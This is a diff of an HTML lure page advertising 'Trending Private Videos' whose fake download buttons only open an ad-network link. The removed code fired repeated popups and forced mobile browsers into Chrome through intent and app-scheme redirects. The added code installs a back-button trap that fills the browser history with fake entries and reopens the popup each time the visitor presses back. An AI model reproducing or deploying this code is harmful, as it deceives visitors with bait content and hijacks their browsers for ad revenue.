@@ -1,506 +1,86 @@
 <!DOCTYPE html>
-
 <html>
-
 <head>
-
 <meta charset="UTF-8">
-
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Trending Videos</title>
-
 <style>
-
-body{
-
-margin:0;
-
-font-family:Arial;
-
-background:#fff;
-
-text-align:center;
-
-}
-
-.header{
-
-padding:20px;
-
-font-size:28px;
-
-font-weight:bold;
-
-color:#ff2d55;
-
-}
-
-.container{
-
-max-width:1200px;
-
-margin:auto;
-
-padding:15px;
-
-display:grid;
-
-grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-
-gap:20px;
-
-}
-
-.card{
-
-background:#fff;
-
-border-radius:12px;
-
-overflow:hidden;
-
-}
-
-.img-wrapper{
-
-position:relative;
-
-width:100%;
-
-aspect-ratio:16/9;
-
-}
-
-.img-wrapper img{
-
-width:100%;
-
-height:100%;
-
-object-fit:cover;
-
-}
-
-.play{
-
-position:absolute;
-
-top:50%;
-
-left:50%;
-
-transform:translate(-50%,-50%);
-
-width:60px;
-
-height:60px;
-
-background:rgba(255,255,255,0.7);
-
-border-radius:50%;
-
-display:flex;
-
-align-items:center;
-
-justify-content:center;
-
-font-size:28px;
-
-}
-
-.badge{
-
-position:absolute;
-
-top:10px;
-
-left:10px;
-
-background:red;
-
-color:#fff;
-
-padding:4px 10px;
-
-border-radius:6px;
-
-font-size:13px;
-
-}
-
-.views{
-
-position:absolute;
-
-bottom:10px;
-
-left:10px;
-
-background:rgba(0,0,0,0.7);
-
-color:#fff;
-
-padding:5px 10px;
-
-border-radius:6px;
-
-font-size:12px;
-
-}
-
-.download{
-
-display:block;
-
-width:90%;
-
-margin:15px auto;
-
-padding:14px;
-
-font-size:16px;
-
-font-weight:bold;
-
-color:#fff;
-
-border:none;
-
-border-radius:10px;
-
-background:linear-gradient(45deg,#ff2d55,#ff7a18,#32d2ff);
-
-cursor:pointer;
-
-}
-
+body{margin:0;font-family:Arial;background:#fff;text-align:center;}
+.header{padding:20px;font-size:28px;font-weight:bold;color:#ff2d55;}
+.container{max-width:1200px;margin:auto;padding:15px;display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;}
+.card{background:#fff;border-radius:12px;overflow:hidden;}
+.img-wrapper{position:relative;width:100%;aspect-ratio:16/9;}
+.img-wrapper img{width:100%;height:100%;object-fit:cover;}
+.play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:60px;height:60px;background:rgba(255,255,255,0.7);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;}
+.badge{position:absolute;top:10px;left:10px;background:red;color:#fff;padding:4px 10px;border-radius:6px;font-size:13px;}
+.views{position:absolute;bottom:10px;left:10px;background:rgba(0,0,0,0.7);color:#fff;padding:5px 10px;border-radius:6px;font-size:12px;}
+.download{display:block;width:90%;margin:15px auto;padding:14px;font-size:16px;font-weight:bold;color:#fff;border:none;border-radius:10px;background:linear-gradient(45deg,#ff2d55,#ff7a18,#32d2ff);cursor:pointer;}
 </style>
-
 </head>
-
 <body>
 
 <div class="header">🔥 Trending Private Videos</div>
-
 <div class="container">
-
-<div class="card">
-
-<span class="badge">TRENDING</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/jreNfSB.webp">
-
-<div class="play">▶</div>
-
-<div class="views">2.1M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">NEW</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/gX7KWNx.webp">
-
-<div class="play">▶</div>
-
-<div class="views">1.4M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">HOT</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/IXZBlC4.webp">
-
-<div class="play">▶</div>
-
-<div class="views">3.7M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">TRENDING</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/yxElBcE.webp">
-
-<div class="play">▶</div>
-
-<div class="views">980K views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">HOT</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/oQQgZMe.webp">
-
-<div class="play">▶</div>
-
-<div class="views">4.3M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">NEW</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/GW4NXbH.webp">
-
-<div class="play">▶</div>
-
-<div class="views">1.2M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">TRENDING</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/lKVNQdv.webp">
-
-<div class="play">▶</div>
-
-<div class="views">2.8M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">HOT</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/4yBqi4t.webp">
-
-<div class="play">▶</div>
-
-<div class="views">5.1M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">NEW</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/hkzfgZo.webp">
-
-<div class="play">▶</div>
-
-<div class="views">1.7M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
-<div class="card">
-
-<span class="badge">TRENDING</span>
-
-<div class="img-wrapper">
-
-<img src="https://i.imgur.com/t1BXLn3.webp">
-
-<div class="play">▶</div>
-
-<div class="views">3.4M views</div>
-
-</div>
-
-<button class="download">Download HD / MP4</button>
-
-</div>
-
+<div class="card"><span class="badge">TRENDING</span><div class="img-wrapper"><img src="https://i.imgur.com/jreNfSB.webp"><div class="play">▶</div><div class="views">2.1M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">NEW</span><div class="img-wrapper"><img src="https://i.imgur.com/gX7KWNx.webp"><div class="play">▶</div><div class="views">1.4M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">HOT</span><div class="img-wrapper"><img src="https://i.imgur.com/IXZBlC4.webp"><div class="play">▶</div><div class="views">3.7M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">TRENDING</span><div class="img-wrapper"><img src="https://i.imgur.com/yxElBcE.webp"><div class="play">▶</div><div class="views">980K views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">HOT</span><div class="img-wrapper"><img src="https://i.imgur.com/oQQgZMe.webp"><div class="play">▶</div><div class="views">4.3M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">NEW</span><div class="img-wrapper"><img src="https://i.imgur.com/GW4NXbH.webp"><div class="play">▶</div><div class="views">1.2M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">TRENDING</span><div class="img-wrapper"><img src="https://i.imgur.com/lKVNQdv.webp"><div class="play">▶</div><div class="views">2.8M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">HOT</span><div class="img-wrapper"><img src="https://i.imgur.com/4yBqi4t.webp"><div class="play">▶</div><div class="views">5.1M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">NEW</span><div class="img-wrapper"><img src="https://i.imgur.com/hkzfgZo.webp"><div class="play">▶</div><div class="views">1.7M views</div></div><button class="download">Download HD / MP4</button></div>
+<div class="card"><span class="badge">TRENDING</span><div class="img-wrapper"><img src="https://i.imgur.com/t1BXLn3.webp"><div class="play">▶</div><div class="views">3.4M views</div></div><button class="download">Download HD / MP4</button></div>
 </div>
 
 <script>
-
 const smartLink = "https://www.profitablecpmratenetwork.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7";
 
-function openExternal(){
-
-  const ua = navigator.userAgent.toLowerCase();
-
-  const isAndroid = /android/.test(ua);
-
-  const isIOS = /iphone|ipad|ipod/.test(ua);
-
-  const isTelegram = /telegram/.test(ua);
-
-  // 👉 1️⃣ first popup (user click)
-
-  let win = window.open(smartLink, "_blank");
-
-  // 👉 fallback যদি block হয়
-
-  if(!win){
-
-    window.location.href = smartLink;
-
-    return;
-
+// 🔥 Single popup trigger (anchor click — Telegram compatible)
+function triggerPopup(){
+  // Method 1: window.open
+  const w = window.open(smartLink, "_blank");
+  // Method 2: anchor fallback (Telegram এ এটাই কাজ করে)
+  if(!w){
+    const a = document.createElement("a");
+    a.href = smartLink;
+    a.target = "_blank";
+    a.rel = "noopener noreferrer";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
   }
-
-  // 👉 2️⃣ second popup
-
-  setTimeout(() => {
-
-    window.open(smartLink, "_blank");
-
-  }, 500);
-
-  // 👉 3️⃣ third popup
-
-  setTimeout(() => {
-
-    window.open(smartLink, "_blank");
-
-  }, 1000);
-
-  // 👉 4️⃣ fourth popup
-
-  setTimeout(() => {
-
-    window.open(smartLink, "_blank");
-
-  }, 1500);
-
-  // 👉 5️⃣ fifth popup
-
-  setTimeout(() => {
-
-    window.open(smartLink, "_blank");
-
-  }, 2000);
-
-  // 👉 final redirect (illusion)
-
-  setTimeout(() => {
-
-    window.location.href = smartLink;
-
-  }, 2500);
-
-  // ✅ TELEGRAM (simple flow)
-
-  if(isTelegram){
-
-    return;
-
-  }
-
-  // 🤖 ANDROID
-
-  if(isAndroid){
-
-    let intentLink =
-
-      "intent://" +
-
-      smartLink.replace(/^https?:\/\//,'') +
-
-      "#Intent;scheme=https;package=com.android.chrome;end";
-
-    setTimeout(()=>{
-
-      window.location.href = intentLink;
-
-    }, 3000);
-
-  }
-
-  // 🍎 IOS
-
-  else if(isIOS){
-
-    let chromeLink =
-
-      "googlechrome://" +
-
-      smartLink.replace(/^https?:\/\//,'');
-
-    setTimeout(()=>{
-
-      window.location.href = chromeLink;
-
-    }, 3000);
-
-  }
-
 }
 
-// 🔥 CLICK EVENT
-
+// 🔥 Per-click popup
 document.addEventListener("click", function(e){
-
   if(e.target.classList.contains("download")){
-
     e.preventDefault();
-
-    openExternal();
-
+    triggerPopup();
   }
-
 });
 
+// 🔙 BACK BUTTON TRAP — unlimited popup
+// History stack এ fake entry inject করি
+history.pushState(null, "", location.href);
+history.pushState(null, "", location.href);
+history.pushState(null, "", location.href);
+
+window.addEventListener("popstate", function(e){
+  // Back button চাপলেই popup trigger
+  triggerPopup();
+  // আবার fake entry push করি — যাতে আবার back চাপলে আবার trigger হয়
+  history.pushState(null, "", location.href);
+});
+
+// 🔄 Page load এ history fill করে রাখি
+window.addEventListener("load", function(){
+  for(let i=0; i<10; i++){
+    history.pushState(null, "", location.href);
+  }
+});
 </script>
 
 </body>
-
 </html>
 
